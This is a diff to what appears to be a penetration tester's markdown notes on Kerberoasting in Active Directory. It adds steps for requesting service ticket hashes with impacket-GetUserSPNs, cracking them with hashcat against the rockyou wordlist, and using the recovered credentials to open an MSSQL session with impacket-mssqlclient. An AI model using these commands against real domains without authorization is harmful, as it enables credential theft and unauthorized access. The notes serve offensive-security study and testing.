@@ -96,4 +96,33 @@ Requesting hash:
 impacket-GetUserSPNs domain/user:password -dc-host hostname_or_ip_of_dc -k -no-pass -request
 ```
 
-### Cracking&#x20;
+### Cracking krb5tgs Hash
+
+1. Copy hash from the GetUserSPNs output
+2. Place in a file called hashes.txt
+3. If you utilize the latest version of hashcat, it will automatically detect the type of hash
+4. Crack:
+
+```
+hashcat hashes.txt /usr/share/wordlist/rockyou.txt
+```
+
+&#x20;5\. View password:
+
+```
+hashcat hashes.txt --show
+```
+
+### Authenticating to svc\_mssql w/ <mark style="color:yellow;">Impacket-mssqlclient</mark>
+
+* Did you get a SPN for svc\_mssql or something similar?
+* You may be able to utilize valid credentials to gain a shell to mssql!
+
+Impacket-mssqlclient:
+
+```
+impacket-mssqlclient domain.local -k
+```
+
+* \-k specifies usage of Kerberos
+
